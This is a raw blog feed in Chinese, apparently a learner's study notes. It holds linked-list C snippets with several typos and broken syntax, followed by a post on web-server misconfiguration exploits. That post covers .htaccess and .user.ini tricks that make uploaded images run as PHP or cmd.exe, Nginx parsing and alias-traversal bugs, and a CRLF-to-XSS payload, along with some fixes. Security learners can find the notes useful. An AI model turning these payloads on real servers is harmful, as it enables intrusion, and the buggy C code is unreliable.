title="尾插法"></a>尾插法</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Linklist <span class="title">linklistcreate</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Linklist L；</span><br><span class="line">    L=(Lnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Lnode));  <span class="comment">//生成头结点L</span></span><br><span class="line">    L-&gt;next=<span class="literal">NULL</span>; </span><br><span class="line">    r=L;          <span class="comment">//尾指针r赋初值</span></span><br><span class="line">    <span class="built_in">scanf</span>(&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x!=flag)&#123;</span><br><span class="line">        s=(Lnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Lnode));   <span class="comment">//生成新结点</span></span><br><span class="line">        S-&gt;data=x; <span class="comment">//新结点赋值</span></span><br><span class="line">        s-&gt;next=<span class="literal">NULL</span>; </span><br><span class="line">        r-&gt;next=s;  <span class="comment">//结点连入链表中，尾插！</span></span><br><span class="line">        r=s;       <span class="comment">//r始终指向最后一个结点</span></span><br><span class="line">        Scanf(&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    Return L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="头插法"><a href="#头插法" class="headerlink" title="头插法"></a>头插法</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Linklist <span class="title">linklistcreate</span><span class="params">()</span><span class="comment">//头插</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Linklist L；</span><br><span class="line">L=(Lnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Lnode));  <span class="comment">//*生成头结点L</span></span><br><span class="line">L-&gt;next=<span class="literal">NULL</span>;   </span><br><span class="line"><span class="built_in">scanf</span>(&amp;x);</span><br><span class="line"><span class="keyword">while</span>(x!=flag)</span><br><span class="line">&#123;s=(Lnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Lnode));   <span class="comment">//生成新结点</span></span><br><span class="line">S-&gt;data=x;                  <span class="comment">//新结点赋值</span></span><br><span class="line">s-&gt;next=<span class="literal">NULL</span>; </span><br><span class="line">s-&gt;next=L-&gt;next;  <span class="comment">//两根链的改变，将新结点加入链表中</span></span><br><span class="line">L-&gt;next=s;      </span><br><span class="line"><span class="built_in">scanf</span>(&amp;x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="合并"><a href="#合并" class="headerlink" title="合并"></a>合并</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MergeList_L</span><span class="params">(LinkList &amp;La,LinkList &amp;Lb,LinkList &amp;Lc)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    pa=La-&gt;next;</span><br><span class="line">    pb=Lb-&gt;next;</span><br><span class="line"> Lc=pc=La;<span class="comment">//用La的头结点作为Lc的头结点</span></span><br><span class="line">  <span class="keyword">while</span>(pa&amp;&amp;pb)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(pa-&gt;data &lt;= pb-&gt;data)<span class="comment">//先插入较小的值</span></span><br><span class="line">         &#123;</span><br><span class="line">            pc-&gt;next=pa;</span><br><span class="line">            pc=pa;</span><br><span class="line">            pa=pa-&gt;next;<span class="comment">//继续将pa的下一个节点赋值给pc</span></span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">           pc-&gt;next=pb;</span><br><span class="line">            pc=pb;</span><br><span class="line">            pb=pb-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  pc-&gt;next=pa?pa:pb;<span class="comment">//插入剩余段</span></span><br><span class="line">  <span class="built_in">free</span>(Lb);<span class="comment">//释放Lb的头结点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="循环链表"><a href="#循环链表" class="headerlink" title="循环链表"></a>循环链表</h2><blockquote><p>循环条件不是P或P-&gt;next是否为空，而是P-&gt;next=H</p></blockquote><p>只剩两个个元素</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">q=L-&gt;next;</span><br><span class="line">p-&gt;data=q-&gt;data;</span><br><span class="line">L-&gt;next=q-&gt;next;</span><br><span class="line">free(q);</span><br></pre></td></tr></table></figure><p>不是最后两个元素</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">q=p-&gt;next;</span><br><span class="line">p-&gt;data=q-&gt;data;</span><br><span class="line">p-&gt;next=q-&gt;next;</span><br><span class="line">free(q);</span><br></pre></td></tr></table></figure><h3 id="合并循环链表"><a href="#合并循环链表" class="headerlink" title="合并循环链表"></a>合并循环链表</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LinkList   <span class="title">merge</span><span class="params">(LinkList LA, LinkList LB)</span>  <span class="comment">//合并两个循环链表的首尾连接起来  </span></span></span><br><span class="line"><span class="function"></span>&#123;      </span><br><span class="line">    linklist *p,  *q; </span><br><span class="line">    p=LA;   </span><br><span class="line">    q=LB; </span><br><span class="line">    <span class="keyword">while</span>(p-&gt;next! =LA) </span><br><span class="line">        p=p-&gt;next;       <span class="comment">// 找到表LA的表尾</span></span><br><span class="line">    <span class="keyword">while</span>(q-&gt;next! =LB) </span><br><span class="line">        q=q-&gt;next;       <span class="comment">// 找到表LB的表尾</span></span><br><span class="line">    q-&gt;next=LA;  </span><br><span class="line">    <span class="comment">// 修改表LB 的尾指针， 使之指向表LA 的头结点 </span></span><br><span class="line">    p-&gt;next=LB-&gt;next; </span><br><span class="line">    <span class="comment">// 修改表LA的尾指针， 使之指向表LB 中的第一个结点</span></span><br><span class="line">    <span class="built_in">free</span>(LB);  </span><br><span class="line">    <span class="keyword">return</span>(LA); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="双向链表"><a href="#双向链表" class="headerlink" title="双向链表"></a>双向链表</h2><h3 id="插入-1"><a href="#插入-1" class="headerlink" title="插入"></a>插入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s-&gt;prior = p-&gt;prior;</span><br><span class="line">p-&gt;prior-&gt;next = s;</span><br><span class="line">s-&gt;next = p;</span><br><span class="line">p-&gt;prior = s;</span><br></pre></td></tr></table></figure><h1 id="栈和队列"><a href="#栈和队列" class="headerlink" title="栈和队列"></a>栈和队列</h1>]]></content>
    
    
    
    <tags>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>中间件漏洞</title>
    <link href="/2020/12/08/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/"/>
    <url>/2020/12/08/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h1><p>php常见运行方式有 apache的模块模式(分为mod_php和mod_cgi) cgi<code>模式, </code>fast-cgi模式</p><ol><li><p>cgi模式就是建立在多进程上的, 但是cgi的每一次请求都会有启动和退出的过程(fork-and-execute模式, 启动脚本解析器解析php.ini 初始化运行环境, 载入dll), 这在高并发时性能非常弱.</p></li><li><p>fast-cgi就是为了解决cgi的问题而诞生的, web server 启动时 会启动fastcgi进程管理器, fastcgi进程管理器读取php.ini文件并初始化, 然后启动多个cgi解释器进程(php-cgi), 当收到请求时,web server会将相关数据发送到fastcgi的子进程 php-cgi中处理.</p></li><li><p>apache模块模式</p><ul><li><p>mod_php模式, apache调用与php相关模块(apache内置), 将php当做apache子模块运行. apache每收到一个请求就会启动一个进程并通过sapi(php和外部通信的接口)来连接php</p></li><li><p>mod_cgi/mod_fcgid模式 使用cgi或者fast-cgi实现.</p></li></ul></li></ol><blockquote><p> 而php版本分为nts(None-Thread Safe) 和 ts(Thread Safe), 在windows中创建线程更为快捷,而在linux中创建进程更快捷,在nts版本下 fast-cgi拥有更好的性能所以windows下经常采用fast-cgi方式解析php. 所以在nts版本里面是没有mod_php (phpxapachexxx.dll)模块的.</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">AddHandler:</span><br><span class="line">AddHandler php5-script .jpg</span><br><span class="line">AddHandler   fcgid-script .jpg</span><br><span class="line">在文件扩展名与特定处理器之间建立映射</span><br><span class="line">Addtype:</span><br><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><h2 id="1-多名后缀"><a href="#1-多名后缀" class="headerlink" title="1.  多名后缀"></a>1.  多名后缀</h2><p>如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag.php.aaa  就会解析为php文件</span><br></pre></td></tr></table></figure><p>其中php文件后缀</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;.+\.ph(p[345]?|t|tml)\.&quot;</span><br><span class="line">php,php3,php4,php5,pht,phtml都会当成php文件执行</span><br></pre></td></tr></table></figure><h2 id="2-htaccess"><a href="#2-htaccess" class="headerlink" title="2.htaccess"></a>2<code>.htaccess</code></h2><blockquote><p> 修改<code>.htaccess</code>的文件名<code>修改apache下的conf文件的AccessFileName .htaccess</code></p></blockquote><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201125000601.png" alt="屏幕截图 2020-11-24 220154"></p><p>作用</p><blockquote><p>.htaccess文件可以配置很多事情，如<strong>是否开启站点的图片缓存</strong>、<strong>自定义错误页面</strong>、<strong>自定义默认文档</strong>、<strong>设置WWW域名重定向</strong>、<strong>设置网页重定向</strong>、<strong>设置图片防盗链和访问权限控制</strong>。但我们这里只关心.htaccess文件的一个作用——MIME类型修改。</p></blockquote><h3 id="生效条件-php解析-命令执行"><a href="#生效条件-php解析-命令执行" class="headerlink" title="生效条件(php解析, 命令执行)"></a>生效条件(php解析, 命令执行)</h3><p>在<code>CGI/FastCGI</code>模式下 (在phpinfo中的Server API查看)</p><p><code>.htaccess</code>文件配置</p><ol><li>将jpg后缀文件解析为php文件</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AddHandler   fcgid-script .jpg</span><br><span class="line">FcgidWrapper &quot;G:/11111111gongju/phpstudy_pro/Extensions/php/php7.0.9nts/php-cgi.exe&quot; .jpg</span><br><span class="line">将php-cgi.exe路径改为对应的php版本即可</span><br></pre></td></tr></table></figure><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201125004422.png" alt="屏幕截图 2020-11-24 220129"></p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201125004325.png" alt="屏幕截图 2020-11-25 004230"></p><ol start="2"><li><p>执行命令(此方法下我无法解析php了)</p><p>AddHandler添加某一特殊文件后缀作为cgi程序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.htaccess</span><br><span class="line"></span><br><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .jpg</span><br><span class="line"></span><br><span class="line">test.jpg</span><br><span class="line">#!C:/Windows/System32/cmd.exe /c start notepad</span><br><span class="line">test</span><br><span class="line"></span><br><span class="line">必须要有两排数据 第二排随意</span><br><span class="line"></span><br><span class="line">方法二:</span><br><span class="line">打开任意文件执行命令</span><br><span class="line">Options +ExecCGI(如果配置文件中有则不用添加)</span><br><span class="line">AddHandler   fcgid-script .jpg</span><br><span class="line">FcgidWrapper &quot;C:/Windows/System32/cmd.exe /c start calc.exe&quot; .jpg</span><br></pre></td></tr></table></figure><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201125221102.png" alt="屏幕截图 2020-11-25 221034"></p></li></ol><blockquote><p>这与apache的conf/vhosts文件夹中的配置相同, 这个文件夹可以在单个ip创建不同域名的配置文件.</p></blockquote><ol start="3"><li>使用<code>SetHandler</code>将目录下所有文件视为cgi程序</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SetHandler cgi-script</span><br><span class="line">或者</span><br><span class="line">SetHandler   fcgid-script</span><br><span class="line">FcgidWrapper &quot;C:/Windows/System32/cmd.exe /c start calc.exe</span><br><span class="line"></span><br><span class="line">不需要添加后缀</span><br></pre></td></tr></table></figure><ol start="4"><li><p>使用相对路径</p><blockquote><p>无法使用绝对路径是可以利用一下</p></blockquote></li></ol><p>在handler模式下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 配置文件中在对应目录下 如: /var/www/html添加  AllowOverride All</span><br><span class="line"></span><br><span class="line">windows下Apache要加载mod_Rewrite模块，配置文件上写上：LoadModule rewrite_module /usr/lib/apache2/modules/mod_rewrite.so</span><br><span class="line"></span><br><span class="line">重启apache</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. AddType application/x-httpd-php .xxx </span><br><span class="line">   AddHandler application/x-httpd-php .xxx    将xxx后缀作为php解析</span><br><span class="line"></span><br><span class="line">2. SetHandler application/x-httpd-php 将该目录下所有文件及其子文件中的文件当做php解析</span><br><span class="line">3.  </span><br><span class="line">  &lt;FilesMatch &quot;.+\.jpg&quot;&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">  &lt;/FilesMatch&gt;</span><br><span class="line">该语句会让Apache把.jpg文件解析为php文件。</span><br></pre></td></tr></table></figure><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201129144102.png" alt="屏幕截图 2020-11-29 143947"></p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201129144108.png" alt="屏幕截图 2020-11-29 143957"></p><ul><li><p>防御方法</p><p>修改匹配规则</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FileMatch</span> &quot;<span class="attr">.</span>+\<span class="attr">.php</span>$&quot;&gt;</span></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"><span class="tag">&lt;/<span class="name">FileMatch</span>&gt;</span></span><br></pre></td></tr></table></figure><p>禁止.php.这样的文件执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FileMatch <span class="string">&quot;.+\.ph(p[3457]?|t|tml)\.&quot;</span>&gt;</span><br><span class="line"><span class="keyword">Require</span> all denied</span><br><span class="line">&lt;/FileMatch&gt;</span><br></pre></td></tr></table></figure></li></ul><p><code>.htaccess包含文件</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_file &quot;test.jpg&quot; 文件开始插入</span><br><span class="line">php_value auto_append_file &quot;test.jpg&quot;  文件结束插入</span><br><span class="line"></span><br><span class="line">利用伪协议 </span><br><span class="line">php_value auto_prepend_file php://filter/convert.base64-decode/resource=test.jpg</span><br><span class="line"></span><br><span class="line">test.jpg  </span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><h3 id="其他利用方式"><a href="#其他利用方式" class="headerlink" title="其他利用方式"></a>其他利用方式</h3><p>查看apache服务器信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler server-status</span><br></pre></td></tr></table></figure><p>绕过preg_math</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">设置回溯限制</span><br><span class="line"> pcre.backtrack_limit给pcre设定了一个回溯次数上限，默认为1000000，如果回溯次数超过这个数字，preg_match会返回false,在,htaccess中手动修改这个限制</span><br><span class="line"> </span><br><span class="line">php_value pcre.backtrack_limit 0</span><br><span class="line">php_value pcre.jit 0</span><br></pre></td></tr></table></figure><p>使<code>.htaccess</code>可以访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">编辑.htaccess</span><br><span class="line">&lt;Files ~ &quot;.htaccess&quot;&gt;</span><br><span class="line">    Require all granted</span><br><span class="line">    Order allow,deny</span><br><span class="line">    Allow from all</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure><p>将<code>.htaccess</code>作为shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files ~ &quot;.htaccess&quot;&gt;</span><br><span class="line">    Require all granted</span><br><span class="line">    Order allow,deny</span><br><span class="line">    Allow from all</span><br><span class="line">&lt;/Files&gt;</span><br><span class="line"></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"></span><br><span class="line">#&lt;?php phpinfo();?&gt;</span><br><span class="line">注意#号</span><br></pre></td></tr></table></figure><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">反斜线绕过</span><br><span class="line">SetHa\</span><br><span class="line">ndler appli\</span><br><span class="line">cation/x-ht\</span><br><span class="line">tpd-php</span><br><span class="line"></span><br><span class="line">文件中不能包含某些关键字符</span><br><span class="line">上传base加密的文件</span><br><span class="line">利用php_value auto_prepend_file包含文件时base解密</span><br><span class="line"></span><br><span class="line">包含session文件</span><br><span class="line"></span><br><span class="line">php_value auto_append_file &quot;/tmp/sess_session文件名&quot;</span><br><span class="line">php_value session.save_path &quot;/tmp&quot;  # session文件储存位置</span><br><span class="line">php_flag session.upload_progress.cleanup off # session上传进度</span><br></pre></td></tr></table></figure><h2 id="3-use-ini"><a href="#3-use-ini" class="headerlink" title="3. .use.ini"></a>3. <code>.use.ini</code></h2><blockquote><p><code>.usr.ini</code>不只是nginx专有的, 只要是以 fastcgi 方式运行php的 都能够使用(apache/nginx/iis), 作用相当于可以自定义的<code>php.ini</code>文件</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=123.jpg 文件前包含</span><br><span class="line">auto_append_file = 123.jpg文件后包含</span><br></pre></td></tr></table></figure><p>让目录下的所有php文件自动包含<code>123.jpg</code>文件</p><h2 id="4-目录遍历"><a href="#4-目录遍历" class="headerlink" title="4. 目录遍历"></a>4. 目录遍历</h2><p><code>httpd.conf</code>下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Options+Indexes+FollowSymLinks +ExecCGI   改为   Options-Indexes+FollowSymLinks +ExecCGI </span><br></pre></td></tr></table></figure><h1 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h1><h2 id="文件名解析漏洞"><a href="#文件名解析漏洞" class="headerlink" title="文件名解析漏洞"></a>文件名解析漏洞</h2><blockquote><p>影响版本:Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">location ~ \.php$ &#123;</span><br><span class="line">    include        fastcgi_params;</span><br><span class="line"></span><br><span class="line">    fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">    fastcgi_index  index.php;</span><br><span class="line">    fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;</span><br><span class="line">    fastcgi_param  DOCUMENT_ROOT /var/www/html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>当nginx匹配到<code>.php</code>结尾的文件时就将其当做php文件解析</p><p>当我们请求<code>test.jpg[0x20][0x00].php</code>时, 就会将其匹配为php文件, 但是nginx却认为这是jpg文件, 将其设置为SCRIPT_FILENAME的值发送给fastcgi, fastcgi根据<code>SCRIPT_FILENAME</code>的值进行解析造成漏洞</p></blockquote><p>我们只需上传一个空格结尾的文件(如<code>1.jpg空格</code>), 访问1.jpg空格[0x00].php就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以先发写为1.jpgaa.php, 然后再hex格式中修改为20 00</span><br></pre></td></tr></table></figure><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201202220517.png" alt="屏幕截图 2020-12-02 220506"></p><h2 id="文件后缀解析"><a href="#文件后缀解析" class="headerlink" title="文件后缀解析"></a>文件后缀解析</h2><p>源文件为<code>test.jpg</code>访问时改为<code>test.jpg/x.php</code>解析为php(x随意)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 在高版本的php中关闭security.limit_extensions(在php-fpm.conf直接删除)</span><br><span class="line">一般为security.limit_extensions php只允许.php文件执行, 添加 .jpg 将jpg文件作为php文件执行, 需要重启php-fpm</span><br><span class="line">2. php.ini中设置cgi.fix_pathinfo=1</span><br><span class="line">当访问/test.jpg/x.php时 若x.php不存在则向前解析</span><br></pre></td></tr></table></figure><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201201204411.png" alt="屏幕截图 2020-12-01 204236"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">修复</span><br><span class="line">php.ini 中的  cgi.fix_pathinfo=0 访问后就是404</span><br><span class="line">将/etc/php5/fpm/pool.d/www.conf 添加 security.limit_extensions = .php</span><br></pre></td></tr></table></figure><h2 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h2><p>http的报文就是<code>CRLF</code>分隔的(回车+换行)</p><p>若nginx在解析url时将其解码则会造成注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">错误的配置文件</span><br><span class="line">location / &#123;</span><br><span class="line">return 302 https://$host$uri;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>详细可参考: <a href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html">Bottle HTTP 头注入漏洞探究 | 离别歌 (leavesongs.com)</a></p><p><a href="https://www.leavesongs.com/PENETRATION/Sina-CRLF-Injection.html">新浪某站CRLF Injection导致的安全问题 | 离别歌 (leavesongs.com)</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在请求时加上</span><br><span class="line">/%0d%0a%0d%0a&lt;img src=1 onerror=alert(/xss/)&gt;(%0d%0a==&gt;回车+换行)</span><br></pre></td></tr></table></figure><h2 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h2><p><code>alias</code>为目录配置别名时, 如果没有没有添加<code>/</code></p><p><code>nginx.conf</code>修改为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location /files &#123;  #这里files就没有闭合</span><br><span class="line">autoindex on;</span><br><span class="line">alias /home/;</span><br></pre></td></tr></table></figure><p>访问<code>files../</code>即可造成目录穿越</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">修复: 将/files闭合  ==&gt;  /files/</span><br></pre></td></tr></table></figure><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201202211725.png" alt="屏幕截图 2020-12-02 211635"></p><h2 id="add-header覆盖"><a href="#add-header覆盖" class="headerlink" title="add_header覆盖"></a>add_header覆盖</h2><p>错误配置文件</p><p>Nginx配置文件子块（server、location、if）中的<code>add_header</code>，将会覆盖父块中的<code>add_header</code>添加的HTTP头</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add_header Content-Security-Policy &quot;default-src &#x27;self&#x27;&quot;;</span><br><span class="line">add_header X-Frame-Options DENY;</span><br><span class="line"></span><br><span class="line">location = /test1 &#123;</span><br><span class="line">    rewrite ^(.*)$ /xss.html break;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location = /test2 &#123;</span><br><span class="line">    add_header X-Content-Type-Options nosniff;  #覆盖掉父块中的配置</span><br><span class="line">    rewrite ^(.*)$ /xss.html break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h1><h2 id="cve-2017-7269"><a href="#cve-2017-7269" class="headerlink" title="cve-2017-7269"></a>cve-2017-7269</h2><blockquote><p>iis 6.0 开启webdav, 攻击前记得拍摄快照!!!!!</p></blockquote><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201205002807.png" alt="屏幕截图 2020-12-05 002759"></p><blockquote><p> 